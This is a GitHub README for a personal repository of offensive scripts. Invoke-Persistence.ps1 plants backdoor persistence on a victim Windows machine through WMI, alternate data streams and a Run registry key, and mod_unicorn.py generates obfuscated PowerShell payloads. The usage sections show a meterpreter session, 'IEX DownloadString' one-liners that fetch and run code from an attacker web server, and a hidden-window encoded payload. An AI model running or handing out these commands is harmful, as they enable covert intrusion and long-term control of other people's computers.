# Random-Scripts
My scripts and modifications to other people's scripts to suit my needs

Invoke-Persistence.ps1
This is a modified version of Invoke-ADSBackdoor persistence script by @enigma0x3. I basically just added WMI persistence capability and the modified it to take a payload as URL. I also modified Nikhil Mittal Remove-Persistence module from Nishang to be able to remove the WMI Persistence module. It basically takes in a URL payload generated by metasploit or cobalt strike stored on your webserver. It used two methods to achieve persistence. If its run with admin privileges it leverages WMI persistence, if run without it creates a payload by using two Alternate Data Streams and creates are key in the registry HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run (lame I know) so its executed on startup. The first Alternate Data stream stores the payload and the second Alternate Data Stream stores some VBScript that acts as a wrapper in order to hide the DOS prompt when invoking the data stream containing the payload. 

USAGE
meterpreter > shell
Process 5604 created.
Channel 6 created.
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  
All rights reserved.
C:\users\test>powershell -exec bypass -command "IEX (New-Object System.Net.Webclient).DownloadString('http://192.168.83.175/Invoke-Persistence.ps1');Invoke-Persistence -URL http://192.168.83.175/rev_https.ps1
powershell -exec bypass -command "IEX (New-Object System.Net.Webclient).DownloadString('http://192.168.83.175/Invoke-Persistence.ps1');Invoke-Persistence -URL http://192.168.83.175/rev_https.ps1

Check and Remove Persistence
C:\users\test>powershell -exec bypass -command "IEX (New-Object System.Net.Webclient).DownloadString('http://192.168.83.175/Invoke-Persistence.ps1');Remove-Persistence
powershell -exec bypass -command "IEX (New-Object System.Net.Webclient).DownloadString('http://192.168.83.175/Invoke-Persistence.ps1');Remove-Persistence
WARNING: WMI permanent event consumer persistence found. Use with -Remove option to clean.

C:\users\test>powershell -exec bypass -command "IEX (New-Object System.Net.Webclient).DownloadString('http://192.168.83.175/Invoke-Persistence.ps1');Remove-Persistence -Remove
powershell -exec bypass -command "IEX (New-Object System.Net.Webclient).DownloadString('http://192.168.83.175/Invoke-Persistence.ps1');Remove-Persistence -Remove
Checking for existence of WMI Persistence
Removing WMI Persistence
Removing the ADS Backdoor
No RegKey Persistence Found

C:\users\test>powershell -exec bypass -command "IEX (New-Object System.Net.Webclient).DownloadString('http://192.168.83.175/Invoke-Persistence.ps1');Remove-Persistence
powershell -exec bypass -command "IEX (New-Object System.Net.Webclient).DownloadString('http://192.168.83.175/Invoke-Persistence.ps1');Remove-Persistence

C:\users\test>

Why?
For some reason Im unable to use the Persistence module from PowerSploit without breaking the Powershell of the Victim computer. Nishang's Add-Persistence non admin technique doesnt leverage ADS. Enigma0x3's script doesnt have a WMI Persistence function.

mod_unicorn.py
This is a fork from TrustedSec's Dave Kennedy powershell payload generator. Sometimes you just want a properly obfuscated unicorned payload without any spaces or fancy character joining to paste into your script. 

USAGE
root@kali:~/unicorn# python mod_unicorn.py 
[*] Generating the payload shellcode.. This could take a few seconds/minutes as we create the shellcode...
[*] Running code through a lame var replace
powershell -nop -win hidden -noni -enc JAB5AGwAbwAgAD0AIAAnACQARgBkAEsAZAAgAD0AIAAnA..
....snip...
QB7ADsAaQBlAHgAIAAiACYAIABwAG8AdwBlAHIAcwBoAGUAbABsACAAJABoAGIAcwAgACQAZQAiADsAfQA=

